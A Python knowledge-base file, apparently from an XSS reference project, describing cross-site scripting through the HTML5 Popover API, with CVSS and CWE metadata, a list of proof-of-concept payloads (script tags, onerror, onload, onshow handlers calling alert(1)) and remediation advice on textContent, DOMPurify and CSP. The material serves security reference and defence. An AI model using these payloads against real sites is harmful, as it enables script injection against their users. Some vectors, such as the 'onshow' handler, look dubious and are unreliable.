#!/usr/bin/env python3

"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Created
Telegram: https://t.me/EasyProTech

Knowledge Base: HTML5 Popover API XSS
"""

DETAILS = {
    "title": "Cross-Site Scripting (XSS) via HTML5 Popover API",
    "severity": "high",
    "cvss_score": 7.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
    "reliability": "high",
    "cwe": ["CWE-79"],
    "owasp": ["A03:2021"],
    "tags": ["xss", "html5", "popover", "modern", "chrome-114"],
    "description": """
HTML5 Popover API (Chrome 114+, Safari 17+) provides native popover functionality without JavaScript.
XSS vulnerabilities occur when user input is reflected in popover content without sanitization.

SEVERITY: HIGH
Modern API with growing adoption. Popover content is rendered in top layer, bypassing some containment.
""",
    "attack_vector": """
POPOVER ATTRIBUTE INJECTION:
<div popover id="user-input"><script>alert(1)</script></div>
<button popovertarget="user-input">Show</button>

POPOVER WITH EVENT HANDLERS:
<div popover id="x" onshow=alert(1)>Content</div>

POPOVER CONTENT INJECTION:
<div popover><img src=x onerror=alert(1)></div>

POPOVER TARGET INJECTION:
<div popover id="<script>alert(1)</script>">Content</div>

POPOVER SHOW METHOD:
element.showPopover();
// If element.innerHTML contains user input

POPOVER TOGGLE:
element.togglePopover();
// XSS if content is user-controlled

POPOVER AUTO ATTRIBUTE:
<div popover="auto" id="x"><svg onload=alert(1)></svg></div>
""",
    "remediation": """
DEFENSE:

1. Sanitize all user input before setting popover content
2. Use textContent instead of innerHTML for popover content
3. Validate popover IDs and targets
4. Implement CSP headers
5. Use DOMPurify for HTML sanitization

SAFE PATTERN:
const popover = document.createElement('div');
popover.setAttribute('popover', '');
popover.textContent = userInput;  // Safe
popover.id = sanitizeId(userInput);

SANITIZATION:
import DOMPurify from 'dompurify';
popover.innerHTML = DOMPurify.sanitize(userInput);

OWASP REFERENCES:
- CWE-79: Cross-site Scripting
- HTML5 Security Cheat Sheet
- Popover API Specification
""",
}
